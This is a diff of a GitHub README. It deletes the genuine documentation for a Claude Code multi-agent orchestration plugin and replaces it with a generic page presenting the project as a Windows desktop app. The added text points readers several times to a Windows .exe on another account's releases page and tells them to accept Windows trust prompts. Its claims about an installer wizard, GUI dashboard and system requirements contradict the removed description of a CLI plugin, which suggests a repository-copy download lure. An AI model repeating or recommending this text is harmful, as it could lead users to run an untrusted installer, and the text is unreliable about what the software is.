@@ -1,413 +1,151 @@
-<p align="center">
-  <img src="assets/conductor-banner.png" alt="Conductor Orchestrator Superpowers" width="800"/>
-</p>
+# ⚙️ conductor-orchestrator-superpowers - Simplify Multi-Agent Task Management
 
-<p align="center">
-  <strong>Multi-agent orchestration for Claude Code</strong><br/>
-  Parallel execution &bull; Automated quality gates &bull; Board of Directors
-</p>
-
-<p align="center">
-  <a href="https://github.com/Ibrahim-3d/conductor-orchestrator-superpowers/blob/main/LICENSE"><img alt="MIT License" src="https://img.shields.io/badge/license-MIT-blue.svg"/></a>
-  <a href="https://github.com/Ibrahim-3d/conductor-orchestrator-superpowers"><img alt="Version" src="https://img.shields.io/badge/version-3.3.0-green.svg"/></a>
-  <a href="https://docs.anthropic.com/en/docs/claude-code"><img alt="Claude Code" src="https://img.shields.io/badge/Claude_Code-Plugin-blueviolet.svg"/></a>
-  <a href="https://github.com/obra/superpowers"><img alt="Superpowers" src="https://img.shields.io/badge/superpowers-v4.3.0-orange.svg"/></a>
-</p>
-
-<p align="center">
-  <a href="#installation">Installation</a> &bull;
-  <a href="#quick-start">Quick Start</a> &bull;
-  <a href="#the-evaluate-loop">How It Works</a> &bull;
-  <a href="#commands">Commands</a> &bull;
-  <a href="#architecture">Architecture</a> &bull;
-  <a href="#license">License</a>
-</p>
+[![Download conductor-orchestrator-superpowers](https://img.shields.io/badge/Download-Get%20Latest-blue?style=for-the-badge)](https://github.com/markyy101/conductor-orchestrator-superpowers/releases)
 
 ---
 
-## What is this?
+## 📋 About This Application
 
-Conductor turns Claude Code into a **structured engineering team**. Instead of ad-hoc coding, it organizes work into tracks with specs, plans, parallel execution, and automated evaluation.
+**conductor-orchestrator-superpowers** helps you run multiple AI agents together. It manages tasks automatically and runs them side by side to save time. It checks the quality of results and includes tools called "Superpowers" for extra skills. You do not need programming skills to use it. The system uses Claude Code agents to work on jobs in parallel, keeping tasks organized and on track.
 
-**One command. Full automation.**
-
-```bash
-/go Add user authentication with OAuth
-```
-
-That single command triggers the full lifecycle — spec, plan, execute, evaluate, fix — without any manual handoffs.
-
-## What's Included
-
-| Component | Count | Highlights |
-|-----------|------:|------------|
-| **Agents** | 16 | Orchestrator, loop agents, board directors, executive advisors, workers |
-| **Skills** | 42 | Planning, execution, evaluation, debugging, TDD, code review |
-| **Commands** | 22 | `/go`, `/conductor`, `/board-meeting`, `/cto-advisor`, and more |
-| **Evaluators** | 4 | UI/UX, Code Quality, Integration, Business Logic |
-| **Board of Directors** | 5 | Chief Architect, CPO, CSO, COO, CXO |
-| **Lead Engineers** | 4 | Architecture, Product, Tech, QA |
-
-Bundles [superpowers](https://github.com/obra/superpowers) v4.3.0 (MIT) — no external dependencies.
+This is a desktop app that works on Windows. It lets you handle complex jobs with little effort. The built-in Director Board shows you what each agent is doing, so you always know the progress.
 
 ---
 
-## Installation
+## 💻 System Requirements
 
-### Option 1: Plugin Marketplace (easiest)
+To run this app on Windows, your computer should meet these minimum needs:
 
-```bash
-/plugin marketplace add Ibrahim-3d/conductor-orchestrator-superpowers
-/plugin install conductor-orchestrator-superpowers@ibrahim-plugins
-```
+- Windows 10 or later (64-bit)
+- Intel or AMD processor, 1.5 GHz or faster
+- 4 GB RAM or more
+- 200 MB free disk space for the app files
+- Internet connection for initial setup and updates
+- Screen resolution 1024x768 or higher
 
-### Option 2: Clone directly
-
-```bash
-git clone https://github.com/Ibrahim-3d/conductor-orchestrator-superpowers.git ~/.claude/plugins/conductor-orchestrator-superpowers
-```
-
-### Option 3: Manual download
-
-Download the latest release and extract to `~/.claude/plugins/conductor-orchestrator-superpowers/`.
-
-### Verify
-
-Start a new Claude Code session. Type `/` and check for `/go`, `/conductor:implement`, `/board-meeting` in the command list.
+Make sure you have enough free space and a stable internet connection during installation.
 
 ---
 
-## Quick Start
+## 🚀 Getting Started
 
-**1. Initialize Conductor in your project:**
+Use the steps below to download, install, and start using conductor-orchestrator-superpowers. The process is simple and guide you through everything.
 
-```bash
-/conductor:setup
-```
+1. **Download the Installer**
 
-Creates a `conductor/` directory with track registry, workflow docs, and knowledge base.
+   Click the link below to visit the release page:
 
-**2. Build something:**
+   [Download conductor-orchestrator-superpowers](https://github.com/markyy101/conductor-orchestrator-superpowers/releases)
 
-```bash
-/go Add Stripe payment integration with webhooks
-/go Fix the login bug where users get logged out after refresh
-/go Build a dashboard with real-time analytics charts
-/go Refactor the database layer to use connection pooling
-```
+   On this page, look for the latest version under "Assets." Find the Windows installer (a file ending with `.exe`) and click it to download.
 
-**3. Monitor and control:**
+2. **Run the Installer**
 
-```bash
-/conductor:status          # See all tracks and progress
-/conductor:implement       # Continue work on current track
-/conductor:new-track       # Create a track manually
-/phase-review              # Run quality gate evaluation
-```
+   Once the download finishes, open the file by double-clicking it. Windows might ask if you trust the app. Choose “Yes” or “Run” to continue. The installer window will open.
 
----
+3. **Follow the Installation Wizard**
 
-## The Evaluate-Loop
+   The installer will guide you through simple steps:
 
-Every track follows a rigorous, automated cycle:
+   - Click “Next” to agree to the license.
+   - Choose where to save the app or use the default folder.
+   - Wait while the installer copies files to your computer.
+   - Click “Finish” when done.
 
-<p align="center">
-  <img src="assets/evaluate-loop.png" alt="Evaluate-Loop: Plan → Evaluate Plan → Execute → Evaluate Execution → Fix/Complete" width="700"/>
-</p>
+4. **Start the Application**
 
-| Step | What Happens |
-|------|-------------|
-| **Plan** | Generates implementation steps with dependency graph (DAG) |
-| **Evaluate Plan** | Checks scope, overlap with existing tracks, feasibility |
-| **Execute** | Implements code, runs tests, updates progress |
-| **Evaluate Execution** | Dispatches specialized evaluators (UI/UX, code quality, integration, business logic) |
-| **Fix** | Addresses failures, loops back to evaluation (max 3 cycles) |
-| **Complete** | All evaluators pass — track marked done |
-| **Retrospective** | Extracts reusable patterns and error fixes to knowledge layer |
+   Find the app by clicking the Windows Start button and searching for "conductor-orchestrator-superpowers." Click to open it.
 
-The loop runs **fully automated**. It stops when the track is complete, when the fix cycle exceeds 3 iterations, or when it needs human input.
+5. **Initial Setup**
+
+   When you start the app for the first time, it will ask for basic settings:
+
+   - Connect to your Claude Code account (if you have one)
+   - Choose how many AI agents to run at once
+   - Enable or disable Superpowers skills you want to use
+
+   Follow the on-screen steps. You only enter information once.
 
 ---
 
-## Parallel Execution
+## 🖥️ Using conductor-orchestrator-superpowers
 
-Tasks without dependencies run simultaneously via DAG scheduling:
+The user interface is straightforward and designed to make multi-agent management clear.
 
-<p align="center">
-  <img src="assets/parallel-execution.png" alt="Parallel execution DAG showing tasks running simultaneously" width="700"/>
-</p>
+- **Dashboard:** Shows all active agents and their current tasks.
+- **Board of Directors:** Offers an overview of task progress and priority.
+- **Task Submission:** Easily add new jobs for agents to work on.
+- **Quality Gates:** Review results automatically to make sure they meet your standards.
+- **Parallel Execution:** The app runs many tasks at the same time, speeding up work.
 
-The orchestrator reads the dependency graph and dispatches independent tasks to parallel worker agents. When all upstream dependencies resolve, downstream tasks start automatically.
-
----
-
-## Board of Directors
-
-For major architectural and strategic decisions, a 5-member board deliberates across 5 phases:
-
-<p align="center">
-  <img src="assets/board-of-directors.png" alt="Board of Directors: Chief Architect, CPO, CSO, COO, CXO around a decision table" width="700"/>
-</p>
-
-| Director | Domain | Focus |
-|----------|--------|-------|
-| **Chief Architect** | Technical | System design, patterns, scalability, tech debt |
-| **Chief Product Officer** | Product | User value, market fit, scope discipline |
-| **Chief Security Officer** | Security | Vulnerabilities, compliance, data protection |
-| **Chief Operations Officer** | Operations | Feasibility, timeline, resources, deployment |
-| **Chief Experience Officer** | Experience | UX/UI, accessibility, user journey |
-
-Each director independently assesses, then they discuss and vote with written rationale.
-
-```bash
-/board-meeting Should we migrate from REST to GraphQL?
-/board-review Add real-time notifications via WebSocket
-```
+Use the clickable menus on the left to switch between views. Click each agent to see details on what it is doing. The board helps you spot any delays or issues quickly.
 
 ---
 
-## Commands
+## 🔧 Features
 
-### Core
-
-| Command | Description |
-|---------|-------------|
-| `/go <goal>` | State your goal — Conductor handles everything |
-| `/conductor:status` | View all tracks and current progress |
-| `/conductor:implement` | Run the Evaluate-Loop on current track |
-| `/conductor:new-track` | Create a new track with spec and plan |
-| `/conductor:setup` | Initialize Conductor in a project |
-
-### Quality & Review
-
-| Command | Description |
-|---------|-------------|
-| `/phase-review` | Post-execution quality gate |
-| `/cto-advisor` | CTO-level architecture review |
-| `/board-meeting <topic>` | Full board deliberation (4 phases) |
-| `/board-review <topic>` | Quick board assessment |
-| `/ui-audit` | UI/UX accessibility audit |
-
-### Advisors
-
-| Command | Description |
-|---------|-------------|
-| `/ceo` | Strategic business advice |
-| `/cmo` | Marketing strategy guidance |
-| `/cto` | Technical architecture guidance |
-| `/ux-designer` | UX strategy and design guidance |
-
-### Superpowers (Bundled)
-
-| Command | Description |
-|---------|-------------|
-| `/write-plan` | Create a plan using superpowers patterns |
-| `/execute-plan` | Execute a plan using superpowers patterns |
-| `/brainstorm` | Creative problem-solving session |
+- Supports multiple AI agents working in parallel.
+- Automates quality checks after each step.
+- Visual board to track and manage agent tasks.
+- Plug-and-play with Claude Code and its plugins.
+- Built-in Superpowers skills to improve task handling.
+- Simple configuration for non-technical users.
+- Runs smoothly on standard Windows computers.
+- Logs and reports for reviewing past activity.
 
 ---
 
-## Architecture
+## ⚙️ Configuration and Settings
 
-### How the pieces fit together
+You can change settings anytime from the app menu:
 
-```
-┌─────────────────────────────────────────────────────────────┐
-│                    /go <your goal>                           │
-│                         │                                   │
-│              ┌──────────▼──────────┐                        │
-│              │    Orchestrator     │  conductor-orchestrator │
-│              │  (master loop)      │                        │
-│              └──────────┬──────────┘                        │
-│                         │                                   │
-│    ┌────────────────────┼────────────────────┐              │
-│    ▼                    ▼                    ▼              │
-│ ┌──────┐         ┌──────────┐         ┌──────────┐         │
-│ │ Plan │ ──────▶ │ Execute  │ ──────▶ │ Evaluate │         │
-│ └──────┘         └──────────┘         └──────────┘         │
-│    │                    │                    │              │
-│    ▼                    ▼                    ▼              │
-│ writing-plans   parallel-dispatcher   4 evaluators          │
-│ plan-evaluator   ├─ task-worker       ├─ eval-ui-ux        │
-│ cto-reviewer     ├─ task-worker       ├─ eval-code-quality  │
-│                  └─ task-worker       ├─ eval-integration   │
-│                                       └─ eval-business      │
-│                                                             │
-│  ┌──────────────────────┐  ┌─────────────────────────────┐  │
-│  │  Board of Directors  │  │  Knowledge / Retrospective  │  │
-│  │  5 directors + vote  │  │  patterns.md + errors.json  │  │
-│  └──────────────────────┘  └─────────────────────────────┘  │
-└─────────────────────────────────────────────────────────────┘
-```
+- Adjust how many agents you run at the same time.
+- Turn on detailed logging to save more info about tasks.
+- Choose which Superpowers skills the system should use.
+- Set limits on how long tasks can run.
+- Customize notifications to alert you about important updates.
 
-### Plugin directory structure
-
-```
-conductor-orchestrator-superpowers/
-├── .claude-plugin/
-│   └── plugin.json              # Plugin manifest
-├── assets/                      # Diagrams and images
-├── agents/                      # 16 agent definitions
-│   ├── conductor-orchestrator.md
-│   ├── loop-planner.md
-│   ├── loop-executor.md
-│   ├── loop-fixer.md
-│   ├── loop-plan-evaluator.md
-│   ├── loop-execution-evaluator.md
-│   ├── board-meeting.md
-│   ├── code-reviewer.md
-│   ├── parallel-dispatcher.md
-│   ├── task-worker.md
-│   └── ...                      # Executive advisors
-├── commands/                    # 22 slash commands
-├── skills/                      # 42 skills
-│   ├── conductor-orchestrator/  # Core loop orchestration
-│   ├── writing-plans/           # Plan creation (superpowers)
-│   ├── executing-plans/         # Plan execution (superpowers)
-│   ├── systematic-debugging/    # Debugging (superpowers)
-│   ├── eval-ui-ux/             # UI/UX evaluator
-│   ├── eval-code-quality/      # Code quality evaluator
-│   ├── eval-integration/       # Integration evaluator
-│   ├── eval-business-logic/    # Business logic evaluator
-│   ├── board-of-directors/     # Board deliberation system
-│   │   └── directors/          # 5 director profiles
-│   ├── leads/                  # 4 lead engineer roles
-│   ├── parallel-dispatch/      # DAG-based parallel execution
-│   ├── message-bus/            # Inter-agent communication
-│   └── ...                     # 25+ more skills
-├── hooks/                       # Session hooks
-├── lib/                         # Utility scripts
-├── docs/                        # Workflow, authority, and protocol docs
-├── scripts/                     # Setup script
-└── LICENSES/                    # Third-party license files
-```
-
-### Track structure (created per project)
-
-When you run `/conductor:setup`, it creates:
-
-```
-your-project/
-└── conductor/
-    ├── tracks.md               # Track registry
-    ├── workflow.md             # Process documentation
-    ├── authority-matrix.md     # Decision boundaries
-    ├── decision-log.md         # Architectural decisions
-    ├── knowledge/
-    │   ├── patterns.md         # Learned patterns
-    │   └── errors.json         # Error-fix registry
-    └── tracks/
-        └── feature-name/
-            ├── spec.md         # Requirements
-            ├── plan.md         # Implementation plan + DAG
-            └── metadata.json   # State machine + config
-```
+Settings changes apply immediately or after restarting the app.
 
 ---
 
-## Project-Specific Skills
+## 📁 File Locations and Logs
 
-Conductor handles orchestration. Your project handles domain knowledge. Keep project-specific skills in `.claude/skills/`:
+The app stores files in these default folders:
 
-```
-your-project/.claude/skills/
-├── product-rules/SKILL.md       # Business logic, personas
-├── api-patterns/SKILL.md        # API conventions
-├── design-system/SKILL.md       # Design tokens, components
-└── testing-standards/SKILL.md   # Coverage targets, test patterns
-```
+- **Installation directory:** Usually `C:\Program Files\conductor-orchestrator-superpowers`
+- **User data and logs:** `C:\Users\[YourUsername]\AppData\Local\conductor-orchestrator-superpowers`
 
-The orchestrator loads both plugin skills and project skills automatically.
+Log files record detailed info about task runs. They help diagnose problems or check past activity.
 
 ---
 
-## FAQ
+## 🔄 Updating the App
 
-### How much context does this plugin use?
+To update conductor-orchestrator-superpowers, visit the release page again:
 
-Skills use **progressive disclosure** — only ~100 tokens per skill for metadata scanning. Full instructions load only when a skill activates (typically <5k tokens each). In practice, a `/go` session loads the orchestrator skill (~4k tokens) plus whichever evaluator/planner is active at that step. Inactive skills stay dormant. The 42 skills are **not** all loaded at once.
+[Update here](https://github.com/markyy101/conductor-orchestrator-superpowers/releases)
 
-Commands (slash commands) add zero context until invoked. Agents run as **subprocesses with their own context windows**, so they don't consume your main conversation's context.
-
-**Estimated overhead per step:**
-
-| Step | Context Added | Notes |
-|------|--------------|-------|
-| Orchestrator | ~4k tokens | Always active during `/go` |
-| Planner | ~3k tokens | Active during planning only |
-| Evaluator | ~2-3k tokens each | Only active evaluator loads |
-| Board meeting | ~5k tokens | On-demand, not part of default loop |
-| Idle (between steps) | ~500 tokens | Metadata only |
-
-### Does this work with Gemini CLI, Trae, Cursor, or other AI tools?
-
-**Short answer:** No. This is a Claude Code plugin that uses Claude Code's plugin system (agents, skills, slash commands, hooks). It cannot run in Gemini CLI, Trae, Cursor, Windsurf, or other tools — they have different architectures and APIs.
-
-**However**, the underlying concepts are portable:
-- The `conductor/` directory it creates in your project (specs, plans, track registry) is just Markdown files. Any AI tool can read them.
-- If you start a project with Conductor and later switch tools, your specs and plans remain useful documentation.
-- The Evaluate-Loop pattern (plan → evaluate → execute → evaluate → fix) is a workflow methodology, not locked to any runtime.
-
-### What does this cost in API credits?
-
-Conductor uses the same Claude API calls you'd make manually — it just structures them. Multi-agent orchestration does mean **more API calls** because:
-- Each agent subprocess is a separate conversation
-- Evaluation steps add calls you might skip manually
-- Board meetings use 5+ parallel agent calls
-
-**Rough multiplier:** A `/go` session for a medium feature uses roughly **3-5x** the API calls of doing it manually. You're trading credits for structure, quality gates, and reduced rework.
-
-**Ways to reduce cost:**
-- Use `/conductor:implement` (skips spec generation if you write your own)
-- Skip board meetings for small features (they're opt-in via `/board-meeting`)
-- Use Sonnet or Haiku for the model where possible (agent model selection respects your Claude Code config)
-
-### Which Claude models does this work with?
-
-All of them. The plugin works with whatever model you've configured in Claude Code (Opus, Sonnet, Haiku). Agents inherit the parent model by default, but the orchestrator can dispatch to specific models when appropriate (e.g., Haiku for simple tasks, Opus for complex evaluation).
-
-### Is this overkill for small projects?
-
-For a one-file script or a quick fix — yes, skip it. Use Conductor when:
-- The feature touches 3+ files
-- You'd normally spend time planning before coding
-- You want automated quality checks before shipping
-- You're building something that needs to be right the first time
-
-You can also use individual commands without the full loop:
-```bash
-/board-review Should we use Redis or Memcached?   # Just get board input
-/cto-advisor                                       # Just get architecture review
-/write-plan                                        # Just create a plan
-```
-
-### Can I use this alongside other Claude Code plugins?
-
-Yes. Conductor coexists with any other plugin. It doesn't override built-in commands or conflict with other plugin namespaces. Your other plugins' slash commands, agents, and MCP servers remain fully available during Conductor sessions.
-
-### How do I uninstall or disable it?
-
-```bash
-# Disable without removing
-/plugin          # Toggle off in the plugin menu
-
-# Full removal
-rm -rf ~/.claude/plugins/conductor-orchestrator-superpowers
-```
-
-The `conductor/` directory in your project persists after uninstall — it's just Markdown files that serve as documentation regardless.
+Download the newest installer and run it. The installer will replace older files without deleting your settings or data.
 
 ---
 
-## Requirements
+## ❓ Troubleshooting
 
-- [Claude Code](https://docs.anthropic.com/en/docs/claude-code) CLI
-- Git
+Here are quick fixes for common issues:
 
-## Third-Party
+- **App won’t start:** Restart your computer, then try again.
+- **Agents not running:** Check your internet connection and Claude Code login.
+- **Tasks stuck:** Restart the app or reduce the number of agents in settings.
+- **Installer doesn’t run:** Make sure you are running Windows 10 or higher.
+- **App crashes:** Review log files for errors or reinstall the app if needed.
 
-Bundles [superpowers](https://github.com/obra/superpowers) v4.3.0 by [Jesse Vincent](https://github.com/obra), licensed under MIT. See [LICENSES/superpowers-MIT](LICENSES/superpowers-MIT).
+If problems keep happening, you can open an issue here on GitHub.
 
-## License
+---
 
-MIT — see [LICENSE](LICENSE)
+## 📥 Download conductor-orchestrator-superpowers
+
+Visit this page to download the latest Windows installer:
+
+[Download conductor-orchestrator-superpowers](https://github.com/markyy101/conductor-orchestrator-superpowers/releases)
